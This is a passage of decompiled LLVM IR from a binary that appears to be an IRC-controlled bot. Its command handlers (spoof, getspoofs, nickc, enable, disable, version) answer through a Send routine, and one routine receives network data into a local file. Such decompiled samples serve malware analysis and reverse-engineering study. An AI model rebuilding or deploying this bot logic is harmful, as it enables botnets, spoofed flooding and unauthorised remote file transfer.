  %v1_10001210 = inttoptr i32 %v1_1000120c to i32*
  %v2_10001210 = load i32, i32* %v1_10001210, align 4
  store i32 268440100, i32* @lr, align 4
  %v3_10001220 = call i32 @__GI_fopen(i32 %v2_10001210, i32 ptrtoint ([3 x i8]* @global_var_10017cbc.50 to i32))
  %v2_1000122c = ptrtoint i32* %stack_var_-4140 to i32
  br label %dec_label_pc_1000122c

dec_label_pc_1000122c:                            ; preds = %dec_label_pc_10001388, %dec_label_pc_100011c0
  store i32 268440132, i32* @lr, align 4
  %v4_10001240 = call i32 @recv(i32 %v3_10000fa4, i32 %v2_1000122c, i32 4096, i32 0)
  %tmp58 = icmp slt i32 %v4_10001240, 1
  br i1 %tmp58, label %dec_label_pc_100013a8, label %dec_label_pc_10001258

dec_label_pc_10001258:                            ; preds = %dec_label_pc_1000122c
  %v2_1000125c = icmp sgt i32 %v4_10001240, 4095
  br i1 %v2_1000125c, label %dec_label_pc_10001284.lr.ph, label %dec_label_pc_10001264

dec_label_pc_10001264:                            ; preds = %dec_label_pc_10001258
  %v2_1000126c = add i32 %v4_10001240, %v2_10001084
  %v3_10001274 = add i32 %v2_1000126c, 1084
  %v4_10001274 = inttoptr i32 %v3_10001274 to i8*
  store i8 0, i8* %v4_10001274, align 1
  br label %dec_label_pc_10001284.lr.ph

dec_label_pc_10001284.lr.ph:                      ; preds = %dec_label_pc_10001264, %dec_label_pc_10001258
  br label %dec_label_pc_10001284

dec_label_pc_10001284:                            ; preds = %dec_label_pc_10001284.lr.ph, %dec_label_pc_10001388
  %storemerge625 = phi i32 [ 0, %dec_label_pc_10001284.lr.ph ], [ %v1_1000138c, %dec_label_pc_10001388 ]
  %v2_10001290 = add i32 %storemerge625, %v2_1000122c
  store i32 ptrtoint ([5 x i8]* @global_var_10017cc0.51 to i32), i32* @r4, align 4
  %v6_100012a4 = inttoptr i32 %v2_10001290 to i8*
  %v7_100012a4 = call i32 @__GI_strncmp(i8* %v6_100012a4, i32 ptrtoint ([5 x i8]* @global_var_10017cc0.51 to i32), i32 4, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  %v3_100012ac = icmp eq i32 %v7_100012a4, 0
  br i1 %v3_100012ac, label %dec_label_pc_100012b4, label %dec_label_pc_10001388

dec_label_pc_100012b4:                            ; preds = %dec_label_pc_10001284
  %v1_100012b8 = add i32 %storemerge625, 4
  %v2_1000137c18 = icmp slt i32 %v1_100012b8, %v4_10001240
  br i1 %v2_1000137c18, label %dec_label_pc_100012c4.lr.ph, label %dec_label_pc_100013a8

dec_label_pc_100012c4.lr.ph:                      ; preds = %dec_label_pc_100012b4
  %v1_100012d0 = add i32 %v3_10001220, 52
  %v2_100012d0 = inttoptr i32 %v1_100012d0 to i32*
  %v1_100012e0 = add i32 %v3_10001220, 16
  %v2_100012e0 = inttoptr i32 %v1_100012e0 to i32*
  %v1_100012e8 = add i32 %v3_10001220, 28
  %v2_100012e8 = inttoptr i32 %v1_100012e8 to i32*
  br label %dec_label_pc_100012c4

dec_label_pc_100012c4:                            ; preds = %dec_label_pc_100012c4.lr.ph, %dec_label_pc_10001368
  %storemerge721 = phi i32 [ %v1_100012b8, %dec_label_pc_100012c4.lr.ph ], [ %v1_1000136c, %dec_label_pc_10001368 ]
  %v3_100012d0 = load i32, i32* %v2_100012d0, align 4
  %v3_100012d4 = icmp eq i32 %v3_100012d0, 0
  br i1 %v3_100012d4, label %dec_label_pc_10001348, label %dec_label_pc_100012dc

dec_label_pc_100012dc:                            ; preds = %dec_label_pc_100012c4
  %v3_100012e0 = load i32, i32* %v2_100012e0, align 4
  store i32 %v3_100012e0, i32* %r11.global-to-local, align 4
  %v3_100012e8 = load i32, i32* %v2_100012e8, align 4
  %v2_100012ec = icmp ult i32 %v3_100012e0, %v3_100012e8
  br i1 %v2_100012ec, label %dec_label_pc_100012f4, label %dec_label_pc_10001324

dec_label_pc_100012f4:                            ; preds = %dec_label_pc_100012dc
  %v3_100012f8 = load i32, i32* %v2_100012e0, align 4
  store i32 %v3_100012f8, i32* %r11.global-to-local, align 4
  %v2_10001304 = add i32 %storemerge721, %v2_10001084
  %v1_10001308 = add i32 %v2_10001304, 1084
  %v2_10001308 = inttoptr i32 %v1_10001308 to i8*
  %v3_10001308 = load i8, i8* %v2_10001308, align 1
  %v3_10001310 = inttoptr i32 %v3_100012f8 to i8*
  store i8 %v3_10001308, i8* %v3_10001310, align 1
  %v0_10001314 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001314 = add i32 %v0_10001314, 1
  store i32 %v1_10001314, i32* %v2_100012e0, align 4
  br label %dec_label_pc_10001368

dec_label_pc_10001324:                            ; preds = %dec_label_pc_100012dc
  %v2_1000132c = add i32 %storemerge721, %v2_10001084
  %v1_10001330 = add i32 %v2_1000132c, 1084
  %v2_10001330 = inttoptr i32 %v1_10001330 to i8*
  %v3_10001330 = load i8, i8* %v2_10001330, align 1
  store i32 ptrtoint (i32* @global_var_10001344.52 to i32), i32* @lr, align 4
  %v4_10001340 = call i32 @putc_unlocked(i8 %v3_10001330, i32 %v3_10001220, i32 %v2_1000132c)
  br label %dec_label_pc_10001368

dec_label_pc_10001348:                            ; preds = %dec_label_pc_100012c4
  %v2_10001350 = add i32 %storemerge721, %v2_10001084
  %v1_10001354 = add i32 %v2_10001350, 1084
  %v2_10001354 = inttoptr i32 %v1_10001354 to i8*
  %v3_10001354 = load i8, i8* %v2_10001354, align 1
  store i32 268440424, i32* @lr, align 4
  %v4_10001364 = call i32 @__GI_fputc(i8 %v3_10001354, i32 %v3_10001220, i32 %v2_10001350)
  br label %dec_label_pc_10001368

dec_label_pc_10001368:                            ; preds = %dec_label_pc_10001324, %dec_label_pc_100012f4, %dec_label_pc_10001348
  %v1_1000136c = add i32 %storemerge721, 1
  %v2_1000137c = icmp slt i32 %v1_1000136c, %v4_10001240
  br i1 %v2_1000137c, label %dec_label_pc_100012c4, label %dec_label_pc_100013a8

dec_label_pc_10001388:                            ; preds = %dec_label_pc_10001284
  %v1_1000138c = add nuw nsw i32 %storemerge625, 1
  %v2_1000139c = icmp slt i32 %v1_1000138c, %v4_10001240
  br i1 %v2_1000139c, label %dec_label_pc_10001284, label %dec_label_pc_1000122c

dec_label_pc_100013a8:                            ; preds = %dec_label_pc_1000122c, %dec_label_pc_10001368, %dec_label_pc_100012b4
  %v2_100013b0 = load i32, i32* %v1_10001210, align 4
  %v6_100013cc = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_10017cc8.53 to i32), i32 %arg2, i32 %v2_100013b0)
  %v1_10001434 = add i32 %v3_10001220, 52
  %v2_10001434 = inttoptr i32 %v1_10001434 to i32*
  %v1_10001444 = add i32 %v3_10001220, 16
  %v2_10001444 = inttoptr i32 %v1_10001444 to i32*
  %v1_1000144c = add i32 %v3_10001220, 28
  %v2_1000144c = inttoptr i32 %v1_1000144c to i32*
  br label %dec_label_pc_100013d0

dec_label_pc_100013d0:                            ; preds = %dec_label_pc_100014cc, %dec_label_pc_100013a8
  store i32 268440552, i32* @lr, align 4
  %v4_100013e4 = call i32 @recv(i32 %v3_10000fa4, i32 %v2_1000122c, i32 4096, i32 0)
  %tmp59 = icmp slt i32 %v4_100013e4, 1
  br i1 %tmp59, label %dec_label_pc_100014ec, label %dec_label_pc_100013fc

dec_label_pc_100013fc:                            ; preds = %dec_label_pc_100013d0
  %v2_10001400 = icmp sgt i32 %v4_100013e4, 4095
  br i1 %v2_10001400, label %dec_label_pc_10001428.lr.ph, label %dec_label_pc_10001408

dec_label_pc_10001408:                            ; preds = %dec_label_pc_100013fc
  %v2_10001410 = add i32 %v4_100013e4, %v2_10001084
  %v3_10001418 = add i32 %v2_10001410, 1084
  %v4_10001418 = inttoptr i32 %v3_10001418 to i8*
  store i8 0, i8* %v4_10001418, align 1
  br label %dec_label_pc_10001428.lr.ph

dec_label_pc_10001428.lr.ph:                      ; preds = %dec_label_pc_10001408, %dec_label_pc_100013fc
  br label %dec_label_pc_10001428

dec_label_pc_10001428:                            ; preds = %dec_label_pc_10001428.lr.ph, %dec_label_pc_100014cc
  %storemerge817 = phi i32 [ 0, %dec_label_pc_10001428.lr.ph ], [ %v1_100014d0, %dec_label_pc_100014cc ]
  store i32 %v3_10001220, i32* %stack_var_-5224, align 4
  %v3_10001434 = load i32, i32* %v2_10001434, align 4
  %v3_10001438 = icmp eq i32 %v3_10001434, 0
  br i1 %v3_10001438, label %dec_label_pc_100014ac, label %dec_label_pc_10001440

dec_label_pc_10001440:                            ; preds = %dec_label_pc_10001428
  %v3_10001444 = load i32, i32* %v2_10001444, align 4
  store i32 %v3_10001444, i32* %r11.global-to-local, align 4
  %v3_1000144c = load i32, i32* %v2_1000144c, align 4
  %v2_10001450 = icmp ult i32 %v3_10001444, %v3_1000144c
  br i1 %v2_10001450, label %dec_label_pc_10001458, label %dec_label_pc_10001488

dec_label_pc_10001458:                            ; preds = %dec_label_pc_10001440
  %v3_1000145c = load i32, i32* %v2_10001444, align 4
  store i32 %v3_1000145c, i32* %r11.global-to-local, align 4
  %v2_10001468 = add i32 %storemerge817, %v2_10001084
  %v1_1000146c = add i32 %v2_10001468, 1084
  %v2_1000146c = inttoptr i32 %v1_1000146c to i8*
  %v3_1000146c = load i8, i8* %v2_1000146c, align 1
  %v3_10001474 = inttoptr i32 %v3_1000145c to i8*
  store i8 %v3_1000146c, i8* %v3_10001474, align 1
  %v0_10001478 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001478 = add i32 %v0_10001478, 1
  %v3_1000147c = load i32, i32* %stack_var_-5224, align 4
  %v2_10001480 = add i32 %v3_1000147c, 16
  %v3_10001480 = inttoptr i32 %v2_10001480 to i32*
  store i32 %v1_10001478, i32* %v3_10001480, align 4
  br label %dec_label_pc_100014cc

dec_label_pc_10001488:                            ; preds = %dec_label_pc_10001440
  %v2_10001490 = add i32 %storemerge817, %v2_10001084
  %v1_10001494 = add i32 %v2_10001490, 1084
  %v2_10001494 = inttoptr i32 %v1_10001494 to i8*
  %v3_10001494 = load i8, i8* %v2_10001494, align 1
  store i32 ptrtoint (i32* @global_var_100014a8.54 to i32), i32* @lr, align 4
  %v4_100014a4 = call i32 @putc_unlocked(i8 %v3_10001494, i32 %v3_10001220, i32 %v2_10001490)
  br label %dec_label_pc_100014cc

dec_label_pc_100014ac:                            ; preds = %dec_label_pc_10001428
  %v2_100014b4 = add i32 %storemerge817, %v2_10001084
  %v1_100014b8 = add i32 %v2_100014b4, 1084
  %v2_100014b8 = inttoptr i32 %v1_100014b8 to i8*
  %v3_100014b8 = load i8, i8* %v2_100014b8, align 1
  store i32 268440780, i32* @lr, align 4
  %v4_100014c8 = call i32 @__GI_fputc(i8 %v3_100014b8, i32 %v3_10001220, i32 %v2_100014b4)
  br label %dec_label_pc_100014cc

dec_label_pc_100014cc:                            ; preds = %dec_label_pc_10001488, %dec_label_pc_10001458, %dec_label_pc_100014ac
  %v1_100014d0 = add nuw nsw i32 %storemerge817, 1
  %v2_100014e0 = icmp slt i32 %v1_100014d0, %v4_100013e4
  br i1 %v2_100014e0, label %dec_label_pc_10001428, label %dec_label_pc_100013d0

dec_label_pc_100014ec:                            ; preds = %dec_label_pc_100013d0
  store i32 268440820, i32* @lr, align 4
  %v1_100014f0 = inttoptr i32 %v3_10001220 to i16*
  %v2_100014f0 = call i32 @__GI_fclose(i16* %v1_100014f0)
  store i32 ptrtoint ([3 x i8]* @global_var_100014fc.55 to i32), i32* @lr, align 4
  %v1_100014f8 = call i32 @close(i32 %v3_10000fa4)
  %v0_10001500 = call i32 @__GI_exit()
  br label %dec_label_pc_10001504

dec_label_pc_10001504:                            ; preds = %entry, %dec_label_pc_100014ec
  %v0_1000151c = phi i32 [ %v1_10000f5c, %entry ], [ %v0_10001500, %dec_label_pc_100014ec ]
  %v2_10001504 = load i32, i32* %stack_var_-5232, align 4
  store i32 %v2_10001504, i32* %r11.global-to-local, align 4
  ret i32 %v0_1000151c

; uselistorder directives
  uselistorder i32 %storemerge817, { 3, 0, 1, 2 }
  uselistorder i32 %v4_100013e4, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge721, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge625, { 2, 0, 1 }
  uselistorder i32 %v4_10001240, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000122c, { 1, 0, 2 }
  uselistorder i32 %v3_10001220, { 11, 0, 1, 9, 3, 2, 10, 7, 4, 6, 5, 8 }
  uselistorder i32 %storemerge570, { 0, 2, 1 }
  uselistorder i32 %storemerge5.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000105c, { 2, 1, 0 }
  uselistorder i32 %v2_10001068.pre-phi, { 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_10001504, { 1, 0 }
  uselistorder label %dec_label_pc_100014cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001428, { 1, 0 }
  uselistorder label %dec_label_pc_100013a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001368, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100012c4, { 1, 0 }
  uselistorder label %dec_label_pc_10001284, { 1, 0 }
  uselistorder label %dec_label_pc_100011c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001168, { 1, 0 }
  uselistorder label %dec_label_pc_1000112c, { 1, 0 }
  uselistorder label %dec_label_pc_10001080, { 1, 0 }
  uselistorder label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000104c, { 1, 0 }
  uselistorder label %dec_label_pc_10000fe0, { 1, 0 }
  uselistorder label %dec_label_pc_10000f98, { 1, 0 }
}

define i32 @getspoofs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp36 = call i8 @__decompiler_undefined_function_2()
  %v3_10001560 = load i32, i32* @global_var_1002efc4.28, align 4
  %v3_10001580 = icmp eq i32 %v3_10001560, 1
  %v3_1000159016 = zext i8 %tmp36 to i32
  br i1 %v3_10001580, label %dec_label_pc_10001588, label %dec_label_pc_100015f8

dec_label_pc_10001588:                            ; preds = %entry
  %v9_100015f0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_10017ce0.56 to i32), i32 %arg2, i32 %v3_1000159016)
  br label %dec_label_pc_100016c0

dec_label_pc_100015f8:                            ; preds = %entry
  %v9_100016bc = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_10017d00.58 to i32), i32 %arg2, i32 %v3_1000159016)
  br label %dec_label_pc_100016c0

dec_label_pc_100016c0:                            ; preds = %dec_label_pc_10001588, %dec_label_pc_100015f8
  %storemerge = phi i32 [ %v9_100016bc, %dec_label_pc_100015f8 ], [ %v9_100015f0, %dec_label_pc_10001588 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_1000159016, { 1, 0 }
  uselistorder label %dec_label_pc_100016c0, { 1, 0 }
}

define i32 @version(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v6_1000171c = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_10017d30.59 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  ret i32 %v6_1000171c
}

define i32 @nickc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10001760 = icmp eq i32 %arg3, 1
  br i1 %v3_10001760, label %dec_label_pc_10001784, label %dec_label_pc_10001768

dec_label_pc_10001768:                            ; preds = %entry
  %v6_1000177c = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_10017d50.60 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_10001784:                            ; preds = %entry
  %v1_10001788 = add i32 %arg4, 4
  %v1_1000178c = inttoptr i32 %v1_10001788 to i32*
  %v2_1000178c = load i32, i32* %v1_1000178c, align 4
  store i32 %v2_1000178c, i32* @r3, align 4
  %v0_10001794 = call i32 @__GI_strlen()
  %tmp9 = icmp ult i32 %v0_10001794, 10
  br i1 %tmp9, label %dec_label_pc_100017c0, label %dec_label_pc_100017a4

dec_label_pc_100017a4:                            ; preds = %dec_label_pc_10001784
  %v6_100017b8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_10017d68.62 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_100017c0:                            ; preds = %dec_label_pc_10001784
  %v2_100017c8 = load i32, i32* %v1_1000178c, align 4
  %v6_100017e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_10017da0.64 to i32), i32 %v2_100017c8, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_100017e4:                            ; preds = %dec_label_pc_100017a4, %dec_label_pc_10001768, %dec_label_pc_100017c0
  %v0_100017f8 = phi i32 [ %v6_100017b8, %dec_label_pc_100017a4 ], [ %v6_1000177c, %dec_label_pc_10001768 ], [ %v6_100017e0, %dec_label_pc_100017c0 ]
  ret i32 %v0_100017f8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100017e4, { 2, 0, 1 }
}

define i32 @disable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10001824 = icmp eq i32 %arg3, 1
  br i1 %v3_10001824, label %dec_label_pc_10001894, label %dec_label_pc_1000182c

dec_label_pc_1000182c:                            ; preds = %entry
  %v6_10001840 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_10017dac.65 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  %v3_10001848 = load i8, i8* @global_var_1002efbc.21, align 1
  %v3_10001850 = icmp eq i8 %v3_10001848, 0
  %. = select i1 %v3_10001850, i32 ptrtoint ([28 x i8]* @global_var_10017dd4.67 to i32), i32 ptrtoint ([9 x i8]* @global_var_10017dc8.66 to i32)
  %v7_1000188c = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_10017df0.68 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001958

dec_label_pc_10001894:                            ; preds = %entry
  %v3_10001898 = load i8, i8* @global_var_1002efbc.21, align 1
  %v3_100018a0 = icmp eq i8 %v3_10001898, 0
  br i1 %v3_100018a0, label %dec_label_pc_100018c4, label %dec_label_pc_100018a8

dec_label_pc_100018a8:                            ; preds = %dec_label_pc_10001894
  %v6_100018bc = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_10017e14.70 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  br label %dec_label_pc_10001958

dec_label_pc_100018c4:                            ; preds = %dec_label_pc_10001894
  %v1_100018c8 = add i32 %arg4, 4
  %v1_100018cc = inttoptr i32 %v1_100018c8 to i32*
  %v2_100018cc = load i32, i32* %v1_100018cc, align 4
  store i32 %v2_100018cc, i32* @r3, align 4
  %v0_100018d4 = call i32 @__GI_strlen()
  %tmp13 = icmp ult i32 %v0_100018d4, 255
  br i1 %tmp13, label %dec_label_pc_10001900, label %dec_label_pc_100018e4

dec_label_pc_100018e4:                            ; preds = %dec_label_pc_100018c4
  %v6_100018f8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_10017e34.72 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  br label %dec_label_pc_10001958

dec_label_pc_10001900:                            ; preds = %dec_label_pc_100018c4
  store i8 1, i8* @global_var_1002efbc.21, align 1
  store i32 268441896, i32* @lr, align 4
  %v3_10001924 = call i32 @__GI_memset(i32 ptrtoint (i32* @global_var_10033968.74 to i32), i32 0, i32 256)
  %v2_10001930 = load i32, i32* %v1_100018cc, align 4
  %v2_10001940 = inttoptr i32 %v2_10001930 to i8*
  %v3_10001940 = call i32 @strcpy(i32 ptrtoint (i32* @global_var_10033968.74 to i32), i8* %v2_10001940)
  %v6_10001954 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_10017e5c.75 to i32), i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 %arg4)
  br label %dec_label_pc_10001958

dec_label_pc_10001958:                            ; preds = %dec_label_pc_100018e4, %dec_label_pc_100018a8, %dec_label_pc_1000182c, %dec_label_pc_10001900
  %v0_1000196c = phi i32 [ %v6_100018f8, %dec_label_pc_100018e4 ], [ %v6_100018bc, %dec_label_pc_100018a8 ], [ %v7_1000188c, %dec_label_pc_1000182c ], [ %v6_10001954, %dec_label_pc_10001900 ]
  ret i32 %v0_1000196c

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10001958, { 3, 0, 1, 2 }
}

define i32 @enable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10001998 = icmp eq i32 %arg3, 1
  br i1 %v3_10001998, label %dec_label_pc_10001a08, label %dec_label_pc_100019a0

dec_label_pc_100019a0:                            ; preds = %entry
  %v6_100019b4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_10017e7c.76 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  %v3_100019bc = load i8, i8* @global_var_1002efbc.21, align 1
  %v3_100019c4 = icmp eq i8 %v3_100019bc, 0
  %. = select i1 %v3_100019c4, i32 ptrtoint ([28 x i8]* @global_var_10017dd4.67 to i32), i32 ptrtoint ([9 x i8]* @global_var_10017dc8.66 to i32)
  %v7_10001a00 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_10017df0.68 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a08:                            ; preds = %entry
  %v3_10001a0c = load i8, i8* @global_var_1002efbc.21, align 1
  %v3_10001a14 = icmp eq i8 %v3_10001a0c, 0
  br i1 %v3_10001a14, label %dec_label_pc_10001a1c, label %dec_label_pc_10001a38

dec_label_pc_10001a1c:                            ; preds = %dec_label_pc_10001a08
  %v6_10001a30 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_10017e98.78 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a38:                            ; preds = %dec_label_pc_10001a08
  %v1_10001a3c = add i32 %arg4, 4
  %v1_10001a40 = inttoptr i32 %v1_10001a3c to i32*
  %v2_10001a40 = load i32, i32* %v1_10001a40, align 4
  store i32 ptrtoint (i32* @global_var_10033968.74 to i32), i32* @r3, align 4
  store i32 %v2_10001a40, i32* @r4, align 4
  %v2_10001a50 = call i32 @__GI_strcasecmp(i32 ptrtoint (i32* @global_var_10033968.74 to i32), i32 %v2_10001a40)
  %v3_10001a58 = icmp eq i32 %v2_10001a50, 0
  br i1 %v3_10001a58, label %dec_label_pc_10001a7c, label %dec_label_pc_10001a60

dec_label_pc_10001a60:                            ; preds = %dec_label_pc_10001a38
  %v6_10001a74 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_10017eb8.80 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a7c:                            ; preds = %dec_label_pc_10001a38
  store i8 0, i8* @global_var_1002efbc.21, align 1
  %v6_10001a9c = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_10017ed4.82 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001aa0:                            ; preds = %dec_label_pc_10001a60, %dec_label_pc_10001a1c, %dec_label_pc_100019a0, %dec_label_pc_10001a7c
  %v0_10001ab4 = phi i32 [ %v6_10001a74, %dec_label_pc_10001a60 ], [ %v6_10001a30, %dec_label_pc_10001a1c ], [ %v7_10001a00, %dec_label_pc_100019a0 ], [ %v6_10001a9c, %dec_label_pc_10001a7c ]
  ret i32 %v0_10001ab4

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_10033968.74 to i32), { 0, 3, 2, 1 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_10001aa0, { 3, 0, 1, 2 }
}

define i32 @spoof(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001ab8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001ab8, i32* %stack_var_-320, align 4
  %v3_10001ae4 = icmp eq i32 %arg3, 1
  br i1 %v3_10001ae4, label %dec_label_pc_10001b20, label %dec_label_pc_10001aec

dec_label_pc_10001aec:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32* %r9.global-to-local, align 4
  %v6_10001b00 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_10017ef4.83 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  store i8* null, i8** @global_var_1002efc0.27, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_1002efc4.28, align 4
  br label %dec_label_pc_10001ce8

dec_label_pc_10001b20:                            ; preds = %entry
  %v1_10001b24 = add i32 %arg4, 4
  store i32 %v1_10001b24, i32* %r9.global-to-local, align 4
  %v1_10001b28 = inttoptr i32 %v1_10001b24 to i32*
  %v2_10001b28 = load i32, i32* %v1_10001b28, align 4
  store i32 %v2_10001b28, i32* @r3, align 4
  %v0_10001b30 = call i32 @__GI_strlen()
  %tmp30 = icmp ult i32 %v0_10001b30, 17
  br i1 %tmp30, label %dec_label_pc_10001b5c, label %dec_label_pc_10001b40

dec_label_pc_10001b40:                            ; preds = %dec_label_pc_10001b20
  store i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32* %r9.global-to-local, align 4
  %v6_10001b54 = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_10017f14.84 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  br label %dec_label_pc_10001ce8

dec_label_pc_10001b5c:                            ; preds = %dec_label_pc_10001b20
  store i32 %v1_10001b24, i32* %r9.global-to-local, align 4
  %v2_10001b64 = load i32, i32* %v1_10001b28, align 4
  store i32 %v2_10001b64, i32* %r9.global-to-local, align 4
  %v2_10001b68 = ptrtoint i32* %stack_var_-300 to i32
  %v2_10001b74 = inttoptr i32 %v2_10001b64 to i8*
  %v3_10001b74 = call i32 @strcpy(i32 %v2_10001b68, i8* %v2_10001b74)
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001b80 = call i32 @__GI_strlen()
  %v2_10001b8c = ptrtoint i32* %stack_var_-312 to i32
  %v1_10001b88 = add i32 %v2_10001b8c, -1
  %v2_10001b90 = add i32 %v1_10001b88, %v0_10001b80
  store i32 %v2_10001b90, i32* %r9.global-to-local, align 4
  %v1_10001b94 = add i32 %v2_10001b90, 12
  %v2_10001b94 = inttoptr i32 %v1_10001b94 to i8*
  %v3_10001b94 = load i8, i8* %v2_10001b94, align 1
  %v3_10001b9c = icmp eq i8 %v3_10001b94, 46
  br i1 %v3_10001b9c, label %dec_label_pc_10001ba4, label %dec_label_pc_10001c10.preheader

dec_label_pc_10001ba4:                            ; preds = %dec_label_pc_10001b5c
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001bac = call i32 @__GI_strlen()
  %v2_10001bbc = add i32 %v1_10001b88, %v0_10001bac
  store i32 %v2_10001bbc, i32* %r9.global-to-local, align 4
  %v3_10001bc4 = add i32 %v2_10001bbc, 12
  %v4_10001bc4 = inttoptr i32 %v3_10001bc4 to i8*
  store i8 0, i8* %v4_10001bc4, align 1
  br label %dec_label_pc_10001c10.preheader

dec_label_pc_10001c10.preheader:                  ; preds = %dec_label_pc_10001b5c, %dec_label_pc_10001ba4
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c1c8 = call i32 @__GI_strlen()
  %v2_10001c2410 = icmp eq i32 %v0_10001c1c8, 0
  br i1 %v2_10001c2410, label %dec_label_pc_10001c2c, label %dec_label_pc_10001bdc

dec_label_pc_10001bdc:                            ; preds = %dec_label_pc_10001c10.preheader, %dec_label_pc_10001c04
  %stack_var_-304.014 = phi i32 [ %v1_10001c08, %dec_label_pc_10001c04 ], [ 0, %dec_label_pc_10001c10.preheader ]
  %stack_var_-308.113 = phi i32 [ %stack_var_-308.0, %dec_label_pc_10001c04 ], [ 1, %dec_label_pc_10001c10.preheader ]
  %v2_10001be4 = add i32 %stack_var_-304.014, %v2_10001b8c
